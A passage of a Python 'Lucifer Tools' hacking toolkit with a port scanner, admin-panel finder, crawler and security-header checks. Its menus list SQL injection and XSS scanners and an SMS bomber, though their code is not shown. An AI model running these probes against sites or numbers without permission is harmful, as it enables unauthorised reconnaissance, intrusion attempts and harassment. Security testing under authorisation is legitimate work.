                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    result = sock.connect_ex((target, port))
                    sock.close()

                    if result == 0:
                        with lock:
                            open_ports.append(port)
                        try:
                            service = socket.getservbyport(port, 'tcp')
                        except:
                            service = "unknown"
                        print(f"{GREEN}[+] Port {port}/tcp open - {service}{RESET}")
                except:
                    pass

            start_time = time.time()

            print(f"{YELLOW}[*] Scanning common ports...{RESET}")
            with ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(scan_port, common_ports)

            remaining_ports = [p for p in range(start_port, end_port + 1) if p not in common_ports]
            if remaining_ports:
                print(f"{YELLOW}[*] Scanning remaining ports...{RESET}")
                with ThreadPoolExecutor(max_workers=threads) as executor:
                    chunk_size = 100
                    for i in range(0, len(remaining_ports), chunk_size):
                        chunk = remaining_ports[i:i + chunk_size]
                        executor.map(scan_port, chunk)

            total_time = time.time() - start_time
            print(f"\n{YELLOW}[*] Scan completed in {total_time:.2f}s{RESET}")
            print(f"{GREEN}[*] Found {len(open_ports)} open ports{RESET}")

            if open_ports:
                print(f"{GREEN}[+] Open ports: {sorted(open_ports)}{RESET}")

        def website_info(self):
            print(f"\n{CYAN}[=== WEBSITE INFORMATION GATHERER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            try:
                response = self.session.get(url, headers=self.get_headers(), timeout=10)

                print(f"\n{GREEN}{'=' * 50}{RESET}")
                print(f"{GREEN}[+] BASIC INFORMATION{RESET}")
                print(f"{GREEN}{'=' * 50}{RESET}")
                print(f"{GREEN}[+] URL: {url}{RESET}")
                print(f"{GREEN}[+] Status Code: {response.status_code}{RESET}")
                print(f"{GREEN}[+] Server: {response.headers.get('Server', 'Unknown')}{RESET}")
                print(f"{GREEN}[+] Content Type: {response.headers.get('Content-Type', 'Unknown')}{RESET}")
                print(f"{GREEN}[+] Content Length: {len(response.content)} bytes{RESET}")

                print(f"\n{GREEN}[+] SECURITY HEADERS{RESET}")
                print(f"{GREEN}{'=' * 50}{RESET}")
                security_headers = {
                    'X-Frame-Options': 'Missing - Clickjacking vulnerability',
                    'X-Content-Type-Options': 'Missing - MIME sniffing vulnerability',
                    'X-XSS-Protection': 'Missing - XSS protection not enabled',
                    'Strict-Transport-Security': 'Missing - HTTPS not enforced',
                    'Content-Security-Policy': 'Missing - Content security policy not set'
                }

                for header, message in security_headers.items():
                    if header in response.headers:
                        print(f"{GREEN}[✓] {header}: {response.headers[header]}{RESET}")
                    else:
                        print(f"{RED}[✗] {header}: {message}{RESET}")

                try:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = soup.find_all('a', href=True)
                    forms = soup.find_all('form')

                    print(f"\n{GREEN}[+] LINKS & FORMS{RESET}")
                    print(f"{GREEN}{'=' * 50}{RESET}")
                    print(f"{GREEN}[+] Found {len(links)} links{RESET}")
                    print(f"{GREEN}[+] Found {len(forms)} forms{RESET}")

                except Exception as e:
                    print(f"{RED}[-] Error parsing HTML: {e}{RESET}")

            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")

        def admin_panel_finder(self):
            print(f"\n{CYAN}[=== ADMIN PANEL FINDER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            url = url.rstrip('/')

            admin_paths = [
                "admin", "administrator", "wp-admin", "wp-login.php", "admin/login",
                "admin_area", "panel", "manage", "login", "dashboard", "user/login",
                "backend", "cp", "controlpanel", "webadmin", "admincp"
            ]

            print(f"\n{GREEN}[*] Searching admin panels on: {url}{RESET}")
            print(f"{YELLOW}[*] Scanning...{RESET}\n")

            found_panels = []

            def check_admin_path(path):
                try:
                    test_url = f"{url}/{path}"
                    response = self.session.get(test_url, headers=self.get_headers(), timeout=5, allow_redirects=False)

                    if response.status_code == 200:
                        title_match = re.search(r'<title>(.*?)</title>', response.text, re.IGNORECASE)
                        title = title_match.group(1) if title_match else "No title"
                        found_panels.append((test_url, response.status_code, title))
                        print(f"{GREEN}[+] ADMIN PANEL: {test_url} (Title: {title[:50]}){RESET}")

                except Exception:
                    pass

            with ThreadPoolExecutor(max_workers=10) as executor:
                executor.map(check_admin_path, admin_paths)

            if not found_panels:
                print(f"{RED}[-] No admin panels found{RESET}")

        def crawler(self):
            print(f"\n{CYAN}[=== WEBSITE CRAWLER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            print(f"\n{GREEN}[*] Crawling: {url}{RESET}")
            print(f"{YELLOW}[*] This may take a while...{RESET}\n")

            visited = set()
            to_visit = [url]

            def crawl_page(page_url):
                if page_url in visited:
                    return
                visited.add(page_url)

                try:
                    response = self.session.get(page_url, headers=self.get_headers(), timeout=8)
                    soup = BeautifulSoup(response.text, 'html.parser')

                    for link in soup.find_all('a', href=True):
                        href = link.get('href')
                        full_url = urllib.parse.urljoin(page_url, href)

                        if url in full_url and full_url not in visited and full_url not in to_visit:
                            to_visit.append(full_url)
                            print(f"{GREEN}[+] Internal: {full_url}{RESET}")

                except Exception as e:
                    print(f"{RED}[-] Failed: {page_url}{RESET}")

            try:
                while to_visit and len(visited) < 50:
                    current_url = to_visit.pop(0)
                    crawl_page(current_url)

                print(f"\n{GREEN}[+] Crawling completed!{RESET}")
                print(f"{GREEN}[+] Internal pages found: {len(visited)}{RESET}")

            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Crawling interrupted by user{RESET}")

        def header_analyzer(self):
            print(f"\n{CYAN}[=== HEADER SECURITY ANALYZER ===]{RESET}")
            url = input("[?] Enter target URL: ").strip()

            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url

            try:
                response = self.session.get(url, headers=self.get_headers(), timeout=10)

                print(f"\n{GREEN}[+] SECURITY HEADER ANALYSIS{RESET}")
                print(f"{GREEN}{'=' * 60}{RESET}")

                security_checks = {
                    'X-Frame-Options': {
                        'check': lambda h: 'X-Frame-Options' in h,
                        'message': 'Protects against clickjacking',
                    },
                    'X-Content-Type-Options': {
                        'check': lambda h: 'X-Content-Type-Options' in h and h['X-Content-Type-Options'] == 'nosniff',
                        'message': 'Prevents MIME type sniffing',
                    },
                    'X-XSS-Protection': {
                        'check': lambda h: 'X-XSS-Protection' in h,
                        'message': 'Enables XSS protection',
                    },
                    'Strict-Transport-Security': {
                        'check': lambda h: 'Strict-Transport-Security' in h,
                        'message': 'Enforces HTTPS',
                    },
                }

                for header, info in security_checks.items():
                    if info['check'](response.headers):
                        value = response.headers.get(header, '')
                        print(f"{GREEN}[✓] {header}: {value}{RESET}")
                    else:
                        print(f"{RED}[✗] {header}: MISSING - {info['message']}{RESET}")

            except Exception as e:
                print(f"{RED}[-] Error: {e}{RESET}")

        def main(self):
            self.banner()

            while True:
                self.show_menu()
                choice = input(f"\n{YELLOW}[?] Select option: {RESET}")

                if choice == '1':
                    self.directory_bruteforce()
                elif choice == '2':
                    self.subdomain_scanner()
                elif choice == '3':
                    self.sql_injection_test()
                elif choice == '4':
                    self.xss_scanner()
                elif choice == '5':
                    self.port_scanner()
                elif choice == '6':
                    self.website_info()
                elif choice == '7':
                    self.admin_panel_finder()
                elif choice == '8':
                    self.crawler()
                elif choice == '9':
                    self.header_analyzer()
                elif choice == '0':
                    print(f"\n{GREEN}[+] Returning to main menu...{RESET}")
                    break
                else:
                    print(f"{RED}[-] Invalid choice{RESET}")

                input(f"\n{YELLOW}Press Enter to continue...{RESET}")

    tool = WebHackingTools()
    tool.main()


# ----------------------------- #
# Main Menu
# ----------------------------- #
def menu():
    while True:
        clear()
        banner()
        print(f"""
{CYAN}==============================
      Lucifer Tools Menu
=============================={RESET}
1. Network Scanner
2. IP Info Lookup
3. Port Scanner
4. System Info
5. File Search
6. Wordlist Generator
7. Password Strength Check
8. Website Status Check
9. Storage Usage
10. Internet Speed Test
11. Hash Generator
12. YouTube Video Info
13. Strong Password Generator
14. URL Shortener
15. Battery Status
16. Send SMS
17. Camera Capture
18. Text → PDF
19. Temp Mail Generator
20. PDF → Text
21. Clipboard Tools
22. Random MAC Generator
23. Lucifer SMS Bomber
24. Password Tools
25. Web Hacking Tools
0. Exit
""")

        choice = input("Choose Option: ")

        if choice == "1":
            arp_scan()
        elif choice == "2":
            ip_lookup()
        elif choice == "3":
            port_scan()
        elif choice == "4":
            system_info()
        elif choice == "5":
            file_search()
        elif choice == "6":
            wordlist()
        elif choice == "7":
            pass_strength()
        elif choice == "8":
            web_status()
        elif choice == "9":
            storage()
        elif choice == "10":
            speed_test()
        elif choice == "11":
            hash_generate()
        elif choice == "12":
            yt_info()
        elif choice == "13":
            strong_pass()
        elif choice == "14":
            url_shortener()
        elif choice == "15":
            battery_status()
        elif choice == "16":
            sms_sender()
        elif choice == "17":
            camera_snap()
        elif choice == "18":
            text_to_pdf()
        elif choice == "19":
            temp_mail()
        elif choice == "20":
            pdf_to_text()
        elif choice == "21":
            clipboard_tools()
        elif choice == "22":
            mac_gen()
        elif choice == "23":
            Lucifer_Bomber()
        elif choice == "24":
            password_tools()
        elif choice == "25":
            web_hacking_tools()
        elif choice == "0":
            clear()
            print("Goodbye Lucifer!")
            sys.exit()
        else:
            print(RED + "Invalid Option!" + RESET)

        input("\nPress Enter to return menu...")


# ----------------------------- #
# Program Entry Point
# ----------------------------- #
if __name__ == "__main__":
    if check_password():
        menu()
    else:
        sys.exit()
